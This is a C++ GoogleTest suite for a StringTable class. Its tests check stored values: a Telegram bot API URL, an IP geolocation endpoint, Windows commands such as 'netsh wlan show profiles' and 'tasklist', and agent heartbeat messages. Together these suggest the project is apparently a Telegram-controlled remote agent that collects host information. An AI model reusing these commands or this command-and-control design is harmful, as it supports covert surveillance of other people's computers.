#include <gtest/gtest.h>

#include "domain/common/StringTable.hpp"

using namespace nuub::domain;

class StringTableTest : public ::testing::Test {
protected:
    void SetUp() override {
        StringTable::init();
    }
};

TEST_F(StringTableTest, StoreAndGet) {
    StringTable::store("test_key", "test_value");
    EXPECT_EQ(StringTable::get("test_key"), "test_value");
}

TEST_F(StringTableTest, GetUnknownKey) {
    EXPECT_TRUE(StringTable::get("nonexistent_key").empty());
}

TEST_F(StringTableTest, InitStoresKnownKeys) {
    EXPECT_EQ(StringTable::get("tg_api"), "https://api.telegram.org/bot");
    EXPECT_EQ(StringTable::get("ipinfo"), "https://ipinfo.io/json");
    EXPECT_EQ(StringTable::get("default_pc"), "PC-Principal");
}

TEST_F(StringTableTest, OverwriteExistingKey) {
    StringTable::store("test_overwrite", "old");
    EXPECT_EQ(StringTable::get("test_overwrite"), "old");
    StringTable::store("test_overwrite", "new");
    EXPECT_EQ(StringTable::get("test_overwrite"), "new");
}

TEST_F(StringTableTest, EmptyStringStoreAndGet) {
    StringTable::store("empty", "");
    EXPECT_TRUE(StringTable::get("empty").empty());
}

TEST_F(StringTableTest, MultipleKeysMaintainIndependence) {
    StringTable::store("key_a", "value_a");
    StringTable::store("key_b", "value_b");
    EXPECT_EQ(StringTable::get("key_a"), "value_a");
    EXPECT_EQ(StringTable::get("key_b"), "value_b");
}

TEST_F(StringTableTest, CommandsAreStored) {
    EXPECT_EQ(StringTable::get("tasklist"), "tasklist /FO CSV 2>&1");
    EXPECT_EQ(StringTable::get("netsh_profiles"), "netsh wlan show profiles 2>&1");
    EXPECT_EQ(StringTable::get("cmd_exe"), "cmd.exe");
}

TEST_F(StringTableTest, MessagesAreStored) {
    EXPECT_EQ(StringTable::get("connected_msg"), "Agente conectado y activo.");
    EXPECT_EQ(StringTable::get("heartbeat_msg"), "Heartbeat - still alive");
}

TEST_F(StringTableTest, ConfigKeysAreStored) {
    EXPECT_EQ(StringTable::get("cfg_token"), "telegram_bot_token");
    EXPECT_EQ(StringTable::get("cfg_pc"), "pc_identifier");
    EXPECT_EQ(StringTable::get("cfg_password"), "encryption_password");
}

TEST_F(StringTableTest, SpecialCharacters) {
    StringTable::store("special", "line1\nline2\ttab");
    EXPECT_EQ(StringTable::get("special"), "line1\nline2\ttab");
}

TEST_F(StringTableTest, LongString) {
    std::string long_str(10000, 'A');
    StringTable::store("long", long_str);
    EXPECT_EQ(StringTable::get("long"), long_str);
}